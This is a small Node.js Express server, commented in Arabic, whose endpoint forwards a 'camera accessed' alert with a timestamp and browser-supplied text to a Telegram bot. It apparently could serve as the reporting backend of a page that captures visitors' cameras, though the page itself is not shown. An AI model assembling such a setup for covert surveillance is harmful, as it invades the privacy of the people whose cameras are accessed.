const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

// إعدادات بوت تليجرام
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع توكن البوت هنا
const CHAT_ID = 'YOUR_CHAT_ID_HERE';    // ضع معرف الدردشة هنا

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// نقطة نهاية تستقبل طلب من المتصفح
app.post('/notify-telegram', async (req, res) => {
    try {
        const { message } = req.body;

        // إرسال رسالة إلى تليجرام
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: `📸 تم الوصول للكاميرا!\n🕒 الوقت: ${new Date().toLocaleString()}\n📝 رسالة إضافية: ${message || 'لا توجد'}`
        });

        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على http://localhost:${PORT}`);
});
